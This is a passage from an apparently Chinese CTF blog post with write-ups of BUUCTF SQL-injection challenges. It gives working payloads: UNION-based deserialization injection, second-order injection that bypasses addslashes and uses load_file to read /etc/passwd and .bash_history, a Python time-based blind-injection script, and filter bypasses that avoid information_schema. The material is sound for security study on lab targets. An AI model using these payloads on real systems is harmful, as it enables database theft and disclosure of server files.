class="subst">&#123;$data-&gt;age&#125;</span>&lt;/td&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;<span class="subst">&#123;$data-&gt;blog&#125;</span>&lt;/td&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/tr&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>接着我们又在<code>view.php</code>发现存在和上面一样的反序列化，并调用了user类里的getBlogContents方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$no = $_GET[<span class="string">&#x27;no&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ($db-&gt;anti_sqli($no))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no hack ~_~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$res = $db-&gt;getUserByNo($no);</span><br><span class="line">$user = unserialize($res[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="comment">//print_r($res);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$response = $user-&gt;getBlogContents();</span><br><span class="line"><span class="keyword">if</span> ($response === <span class="number">404</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;404 Not found&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$base64 = base64_encode($response);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;iframe width=&#x27;100%&#x27; height=&#x27;10em&#x27; src=&#x27;data:text/html;base64,<span class="subst">&#123;$base64&#125;</span>&#x27;&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// echo $response;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// var_dump($user-&gt;getBlogContents());</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>捋下思路，index.php会获取所有用户，并把数据库中data字段反序列化，view.php会访问之前留的blog链接的内容，而在index.php那里存在正则过滤，我们无法在blog插入<code>file://</code>协议读源码的代码，但在view.php并不存在过滤，并且此处存在sql注入，所以我们可以直接union一个假的用户,data在第四个字段上</p>
+<p>exp:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> UserInfo());</span><br></pre></td></tr></table></figure>
+
+<p>请求带上，注意序列化字符串要加上引号</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=<span class="number">-1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406122033.png" style="zoom:80%;">
+
+<p>查看源代码，点data协议就行</p>
+<p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM%E6%88%AA%E5%9B%BE20200406122146.png"></p>
+<h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><h3 id="writeup-4"><a href="#writeup-4" class="headerlink" title="writeup"></a>writeup</h3><p>扫目录，发现git源码泄露，git_extract恢复，得到<code>write_do.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>login.php</code>爆破弱口令，密码为<code>zhangwei666</code></p>
+<p><strong>addslashes()函数</strong>：</p>
+<img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406152546.png" style="zoom:80%;">
+
+<p>题目考察的是二次注入，即先向数据库插入闭合语句，然后再在查询时取出来，达到绕过addslashes()函数的作用</p>
+<p>从上面的代码可以看到write那块是插入帖子信息到数据库，而comment那块是把评论并存到数据库里，并且这块根据id值取出了帖子category参数的内容，并插入数据库，所以，现在思路很明确，先发一个帖子，在category里写入<code>&#39;</code>闭合</p>
+<img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406151519.png" style="zoom:80%;">
+
+<p>此时执行的sql语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> board</span><br><span class="line">            <span class="keyword">set</span> <span class="keyword">category</span> = <span class="string">&#x27;\&#x27;</span>,<span class="keyword">content</span>=<span class="keyword">database</span>(),<span class="comment">/*&#x27;,</span></span><br><span class="line"><span class="comment">                title = &#x27;aaaaaaa&#x27;,</span></span><br><span class="line"><span class="comment">                content = &#x27;adsd&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>由于转义，插入到数据库的内容category字段值为<code>&#39;,content=database(),/*</code></p>
+<p>接着我们再</p>
+<img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406152003.png" style="zoom:80%;">
+
+<p>此时执行插入操作的sql语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">comment</span></span><br><span class="line">            <span class="keyword">set</span> <span class="keyword">category</span> = <span class="string">&#x27;&#x27;</span>,<span class="keyword">content</span>=<span class="keyword">database</span>(),<span class="comment">/*&#x27;,</span></span><br><span class="line"><span class="comment">                content = &#x27;*/</span><span class="comment">#&#x27;,</span></span><br><span class="line">                bo_id = <span class="string">&#x27;9&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>就成功把database()作为content字段的内容插入</p>
+<img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406152746.png" style="zoom:80%;">
+
+<p>按照这种思路load_file读取文件<code>/etc/passwd</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;,content=(<span class="keyword">select</span>(<span class="keyword">load_file</span>(<span class="string">&quot;/etc/passwd&quot;</span>))),<span class="comment">/*</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406153117.png" style="zoom:80%;">
+
+<p>看到<code>/home/www</code>以bash运行，读一下<code>/home/www/.bash_history</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;,content=(<span class="keyword">select</span>(<span class="keyword">load_file</span>(<span class="string">&quot;/home/www/.bash_history&quot;</span>))),<span class="comment">/*</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406153402.png" style="zoom:80%;">
+
+<p>看命令可以猜测再<code>/tmp/html/.DS_Store</code>文件，直接读会读不全，用hex编码</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;,content=(<span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">load_file</span>(<span class="string">&quot;/tmp/html/.DS_Store&quot;</span>))),<span class="comment">/*</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406154005.png" style="zoom:80%;">
+
+<p>访问一下，确实有，读一下<code>flag_8946e1ff1ee3e40f.php</code>文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;,content=(<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;</span>)),<span class="comment">/*</span></span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406154459.png" style="zoom:80%;">
+
+<h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><h3 id="writeup-5"><a href="#writeup-5" class="headerlink" title="writeup"></a>writeup</h3><p>打开跳转到<code>login.php</code>，不知道为啥扫目录扫不到<code>register.php</code>,可能是buu环境的问题吧</p>
+<p>先在login.php试了很久没有啥收获，先注册一个账号吧，登陆发现除了用户名啥都没有，fuzz一下，发现username处有注入</p>
+<img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/QQ截图20200808174356.png" style="zoom:80%;">
+
+<p>fuzz一下发现过滤了<code>,</code>和<code>information</code>，由于逗号过滤</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(1,1,0)	&lt;==&gt;  case when 1 then 1 else 0 end</span><br><span class="line">substr(database(),1,1)	&lt;==&gt;	substr(database() from 1 for 1)</span><br><span class="line">limt 9,4	&lt;==&gt;	limit 9 offset 4</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20200808192506.png"></p>
+<p>测试上面payload可用，就可以写脚本了，exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://e2237b8f-0ea4-4294-bbe7-007af8f88f8b.node3.buuoj.cn/register.php&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">proxies=&#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        p1=<span class="string">&quot;aaaaa&#x27; || (case when ascii(substr((select*from flag) from &#123;&#125; for 1))&gt;&#123;&#125; then sleep(3) else 0 end) || &#x27;aaa&quot;</span>.format(i,mid)</span><br><span class="line">        p2=<span class="string">&quot;aaaaa&#x27; || (case when ascii(substr((select*from flag) from &#123;&#125; for 1))=&#123;&#125; then sleep(3) else 0 end) || &#x27;aaa&quot;</span>.format(i,mid)</span><br><span class="line">        data1=&#123;<span class="string">&#x27;email&#x27;</span>:<span class="string">&#x27;basb@qq.com&#x27;</span>,<span class="string">&#x27;username&#x27;</span>:p1,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;1234&#x27;</span>&#125;</span><br><span class="line">        data2=&#123;<span class="string">&#x27;email&#x27;</span>:<span class="string">&#x27;basb@qq.com&#x27;</span>,<span class="string">&#x27;username&#x27;</span>:p2,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;1234&#x27;</span>&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(i,mid)</span><br><span class="line">            r1=requests.post(url,data=data2,timeout=<span class="number">3</span>,proxies=proxies)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">            flag+=chr(mid)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r2=requests.post(url,data=data1,timeout=<span class="number">3</span>,proxies=proxies)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><h3 id="writeup-6"><a href="#writeup-6" class="headerlink" title="writeup"></a>writeup</h3><p>广告处二次注入,过滤了空格，先判断列数，一个一个试发现有22列，判断回显位发现：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test&#x27;<span class="comment">/**/</span>UNION<span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20200808162756.png"></p>
+<p>回显位为2,3位</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test1&#x27;<span class="comment">/**/</span>UNION<span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">database</span>(),(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">concat</span>(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="keyword">database</span>()),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>直接用发现会被拦，过滤了information_schema，bypass参考:</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a></p>
+<p>可以无列名注入绕过，先猜一下表名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test2&#x27;<span class="comment">/**/</span>UNION<span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">count</span>(*)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20200808165041.png"></p>
+<p>三条，说明存在该表</p>
+<img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/QQ截图20200808171132.png" style="zoom: 80%;">
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test3&#x27;<span class="comment">/**/</span>UNION<span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>b<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span>*<span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>)c),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20200808171715.png"></p>
+<p>注flag内容</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test4&#x27;<span class="comment">/**/</span>UNION<span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(b)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>b<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span>*<span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>)c),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.m00nback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/>http://www.m00nback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-08-08T20:39:55+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2020年8月8日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/web/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>web</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/buuctf/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>buuctf</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>sql注入</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.m00nback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/&title=buuctf刷题-sql注入篇 - 明月归的小站&summary=本篇博客主要记录了buuctf上web部分sql注入类型题目的writeup！持续更新！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
